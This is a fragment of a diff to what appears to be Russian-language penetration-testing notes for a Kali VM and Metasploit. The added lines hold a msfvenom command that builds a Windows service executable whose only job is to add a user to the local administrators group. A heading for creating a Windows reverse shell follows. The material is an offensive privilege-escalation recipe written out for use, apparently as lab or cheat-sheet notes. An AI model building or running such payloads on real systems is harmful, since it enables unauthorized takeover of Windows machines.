@@ -32,7 +32,9 @@ Kali VM
 5. In Metasploit (msf > prompt) type: set LPORT 5555
 6. In Metasploit (msf > prompt) type: run
 
-   
+# Содаем исполнимый файл для виндовс
+
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
 
 # Создаем реверс шелл для виндовс
 
